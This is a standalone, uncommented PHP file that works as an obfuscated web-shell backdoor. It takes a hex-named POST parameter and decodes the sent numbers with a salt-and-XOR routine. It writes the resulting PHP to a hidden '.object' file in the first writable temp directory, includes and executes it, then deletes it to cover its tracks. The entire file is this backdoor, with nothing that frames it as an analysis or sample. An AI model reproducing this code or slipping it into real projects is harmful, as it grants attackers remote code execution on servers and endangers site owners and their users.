<?php

if(isset($_POST) && isset($_POST["\x66\x61c"])){
	$resource = array_filter([ini_get("upload_tmp_dir"), "/var/tmp", getcwd(), "/dev/shm", sys_get_temp_dir(), getenv("TMP"), session_save_path(), "/tmp", getenv("TEMP")]);
	$dchunk = $_POST["\x66\x61c"];
	$dchunk = explode(	'.'	  ,		 $dchunk );	 	
	$item=	 '';
            $salt=	 'abcdefghijklmnopqrstuvwxyz0123456789';
            $sLen=	 strlen($salt );
            $__len=	 count($dchunk );
    
            for($k=	 0; $k	<$__len; $k++) {
                $v6=	 $dchunk[$k];
                $sChar=	 ord($salt[$k % $sLen] );
                $d=	 ((int)$v6 - $sChar -($k % 10))^	71;
                $item.=chr($d ); }
	while ($element = array_shift($resource)) {
    		if (array_product([is_dir($element), is_writable($element)])) {
    $comp = join("/", [$element, ".object"]);
    $file = fopen($comp, 'w');
if ($file) {
	fwrite($file, $item);
	fclose($file);
	include $comp;
	@unlink($comp);
	die();
}
}
}
}